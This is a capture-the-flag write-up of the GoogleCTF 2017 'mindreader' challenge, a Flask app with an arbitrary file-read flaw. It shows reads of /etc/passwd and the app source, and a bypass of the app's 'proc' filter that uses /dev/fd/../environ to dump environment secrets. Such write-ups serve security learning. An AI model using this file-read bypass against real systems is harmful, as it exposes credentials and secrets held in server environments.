# Intro

This is my writeup for GoogleCTF 2017 `mindreader` challenge. This one took me a while!

Let's start. So we received a URL fora webapp showing only this form:

![](index.png)

Good luck! :-)


# Let the hunt begin

The form says 'Hello, what do you want to read?'. Well, I'd likethe flag please. But any way I asked, I got back:

![](not-found.png)

Getting more serious I entered `/etc/passwd` and I got back the password file. Usually it has local users and application users listed, but this file was actually very empty. Strange.

```

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
```

Still nice to be able to browse the filesystem. This might be an easy challenge (well, think again).

Let's query for some files to discover more details about the host, software used and off course our app.

## OS hunting
`/etc/debian_version` exists. The host runs Debian 8.8.


## /etc/mtab

`/etc/mtab` returned and one line was interesting:

```
/dev/sda1 /var/log/app_engine ext4 rw,relatime,data=ordered 0 0
```

Is the webapp running in Google's AppEngine?

## /etc/resolv.conf
Then `/etc/resolv.conf`:

```
search c.ctf-web-kuqo48d.internal. google.internal.
nameserver 127.0.0.11
options ndots:0
```

This re-confirms the host is running in Google Cloud Platform.

But that `nameserver` value is strange. Are we running inside of a Docker container?

## /proc ??

I tried `/proc/cpuinfo` to see what hardware the host has. But it seems anything in `/proc` is off limits.

Is there a WAF (web application firewall) in place?


## Lots more

I found lots more files, but nothing gave me a breakthrough.

## Doubling back

An hour later I doubled back to the application and entered `index.html`. I got back the HTML file with the 'what do you want to read' form. Now I knew the application read files relative its current work directory.

After trying variants of .cgi, .php files I took a step back and thought about Google's AppEngine. Python has nice integration and it is a popular language for webapplications.

So I Googled my way into a Python AppEngine example project at [Github](https://github.com/GoogleCloudPlatform/python-docs-samples/tree/master/appengine/standard/hello_world), which listed the files `main.py` and `app.yaml`.

Tried both: `app.yaml` was missing, but I forgot about that very quickly because `main.py` was readable. It contained the sourcecode of our webapp:

```
from flask import Flask, request, abort
import re
import os
import logging

assert os.environ['FLAG']

app = Flask(__name__)

INDEX = open('index.html').read()

HALL_OF_SHAME = []

@app.route('/')
def index():
    for ip in request.headers.get('X-Forwarded-For', '').split(','):
        ip = ip.strip().lower()
        if ip in HALL_OF_SHAME:
            abort(403)

    if 'f' in request.args:
        try:
            f = request.args['f']
            if re.search(r'proc|random|zero|stdout|stderr', f):
                abort(403)
            elif '\x00' in f:
                abort(404)
            return open(f).read(4096)
        except IOError:
            abort(404)
    else:
        return INDEX
```

Our app is a small Flask webapp!

It explains why I could not read any files in `/proc`. Any filename containing the string `proc` (and some others) are blocked.

And there is a reference to the flag. It is stored in the environment. Getting close! (Right?)



## Reading app's environment

OK. Two options here:

- reading `/proc/self/environ`
- finding any config file for the webapp

That WAF was blocking access to the environ file so I tried to find a configfile.

Back to file hunting I get `requirements.txt` - a configuration file used for installing python modules using pip. Its content:

```
gunicorn==19.7.1
Flask==0.12.1
gevent
```

More files later I got `gunicorn.conf.py`:

```
import multiprocessing

worker_class = 'gevent'
workers = multiprocessing.cpu_count()
threads = 25
```

But really nothing else.

## I want that environment!

So doubling back (again) to the inaccessible `/proc/self/environ`.

Re-reading the `main.py` and wondering about two things:

- why `elif '\x00' in f:` - what is so 'bad' about a zero byte?
- that WAF regex `proc|random|zero|stdout|stderr` - why not just `proc` ? what is so 'bad' about the rest?


### Unicode?

I am not sure about why '\x00' is bad. I initially thought it was a way to prevent bypassing the `proc` filter by encoding the filename with unicode, which adds `\x00` bytes.

```
>>> "/proc/cpuinfo".encode("utf-16")
'\xff\xfe/\x00p\x00r\x00o\x00c\x00/\x00c\x00p\x00u\x00i\x00n\x00f\x00o\x00'
```

But Python's `open` function does not like `\x00` bytes:

```
>>> open("/etc/password".encode("utf-16")).read()
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: embedded NUL character
```

So bypassing the `/proc` filter using unicode was not possible.

### Bypass /proc

And back to the WAF regex and I realized the other blocked words `random`, `zero`, `stdout` and `stderr`, were are filenames that could be found in the `/dev` path.

Knowing the app was running on Debian 8.8 (Jessie) I started a local Docker container and looked at `/dev`:

```
$ docker run --rm -ti debian:jessie
root@bfd12faaecb2:/# cd /dev
root@bfd12faaecb2:/dev# ls -al
total 4
drwxr-xr-x 5 root root    360 Jun 18 21:34 .
drwxr-xr-x 1 root root   4096 Jun 18 21:34 ..
crw------- 1 root root 136, 0 Jun 18 21:34 console
lrwxrwxrwx 1 root root     11 Jun 18 21:34 core -> /proc/kcore
lrwxrwxrwx 1 root root     13 Jun 18 21:34 fd -> /proc/self/fd
crw-rw-rw- 1 root root   1, 7 Jun 18 21:34 full
drwxrwxrwt 2 root root     40 Jun 18 21:34 mqueue
crw-rw-rw- 1 root root   1, 3 Jun 18 21:34 null
lrwxrwxrwx 1 root root      8 Jun 18 21:34 ptmx -> pts/ptmx
drwxr-xr-x 2 root root      0 Jun 18 21:34 pts
crw-rw-rw- 1 root root   1, 8 Jun 18 21:34 random
drwxrwxrwt 2 root root     40 Jun 18 21:34 shm
lrwxrwxrwx 1 root root     15 Jun 18 21:34 stderr -> /proc/self/fd/2
lrwxrwxrwx 1 root root     15 Jun 18 21:34 stdin -> /proc/self/fd/0
lrwxrwxrwx 1 root root     15 Jun 18 21:34 stdout -> /proc/self/fd/1
crw-rw-rw- 1 root root   5, 0 Jun 18 21:34 tty
crw-rw-rw- 1 root root   1, 9 Jun 18 21:34 urandom
crw-rw-rw- 1 root root   1, 5 Jun 18 21:34 zero
```

Are you seeing those symlinks? Can we maybe use that to bypass the `proc` filter?

Let's try `/dev/fd/../environ` and BINGO!

```
GAE_MEMORY_MB=614
HOSTNAME=29d21dea6d17
GAE_INSTANCE=aef-mindreader--sss6w3uqjfrcntmn-20170617t103851-6lrq
PORT=8080
HOME=/root
PYTHONUNBUFFERED=1
GAE_SERVICE=mindreader-sss6w3uqjfrcntmn
PATH=/env/bin:/opt/python3.5/bin:/opt/python3.6/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
GAE_DEPLOYMENT_ID=402032768035787859
LANG=C.UTF-8
DEBIAN_FRONTEND=noninteractive
GCLOUD_PROJECT=ctf-web-kuqo48d
GOOGLE_CLOUD_PROJECT=ctf-web-kuqo48d
CHALLENGE_NAME=mindreader
VIRTUAL_ENV=/env
PWD=/home/vmagent/app
GAE_VERSION=20170617t103851
FLAG=CTF{ee02d9243ed6dfcf83b8d520af8502e1}
```

Done and done!


# Wrap-up

What an excellent challenge. It took me hours on and off, thinking, puzzling, investigating. Many doubling-backs. Never give up.

Google, well done!







